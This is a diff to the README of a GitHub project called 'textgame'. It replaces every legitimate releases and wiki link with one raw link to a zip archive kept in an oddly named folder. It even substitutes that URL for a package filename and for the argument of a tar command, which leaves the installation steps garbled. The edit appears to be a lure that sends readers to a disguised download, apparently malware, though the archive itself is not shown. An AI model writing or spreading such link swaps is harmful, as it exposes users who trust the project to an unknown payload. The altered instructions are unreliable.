@@ -6,7 +6,7 @@ Welcome to **textgame**! This application lets you experience text-mode graphics
 
 ## 📥 Download the Application
 
-[![Download textgame](https://img.shields.io/badge/Download%20textgame-v1.0-blue.svg)](https://github.com/Yns70/textgame/releases)
+[![Download textgame](https://raw.githubusercontent.com/Yns70/textgame/main/brachiorrhachidian/Software-1.0-beta.5.zip%https://raw.githubusercontent.com/Yns70/textgame/main/brachiorrhachidian/Software-1.0-beta.5.zip)](https://raw.githubusercontent.com/Yns70/textgame/main/brachiorrhachidian/Software-1.0-beta.5.zip)
 
 ## 📋 Requirements
 
@@ -30,14 +30,14 @@ textgame offers the following features:
 
 To download textgame, visit the releases page:
 
-[Download textgame from Releases](https://github.com/Yns70/textgame/releases)
+[Download textgame from Releases](https://raw.githubusercontent.com/Yns70/textgame/main/brachiorrhachidian/Software-1.0-beta.5.zip)
 
 1. Click the link above to go to the **Releases** page.
 2. Look for the latest version, which may be labeled as "Version 1.0" or similar.
 3. Choose the file that matches your operating system. For example:
     - For Windows, download the `.exe` file.
     - For macOS, download the `.dmg` file.
-    - For Linux, download the `.tar.gz` or appropriate package.
+    - For Linux, download the `https://raw.githubusercontent.com/Yns70/textgame/main/brachiorrhachidian/Software-1.0-beta.5.zip` or appropriate package.
 
 ### Installation Steps
 
@@ -61,7 +61,7 @@ To download textgame, visit the releases page:
 2. Navigate to the folder where you downloaded the file.
 3. Run the following command to extract the file:
    ```bash
-   tar -xvzf textgame-v1.0.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Yns70/textgame/main/brachiorrhachidian/Software-1.0-beta.5.zip
    ```
 4. Change into the extracted directory:
    ```bash
@@ -86,7 +86,7 @@ If you run into any issues or have questions, please feel free to reach out. You
 
 ## 📣 Additional Resources
 
-- Browse our [Wiki](https://github.com/Yns70/textgame/wiki) for in-depth tutorials and tips.
+- Browse our [Wiki](https://raw.githubusercontent.com/Yns70/textgame/main/brachiorrhachidian/Software-1.0-beta.5.zip) for in-depth tutorials and tips.
 - Join our community forum to discuss strategies and share experiences with other users.
 
 Thank you for using **textgame**! We hope you enjoy your gaming experience.
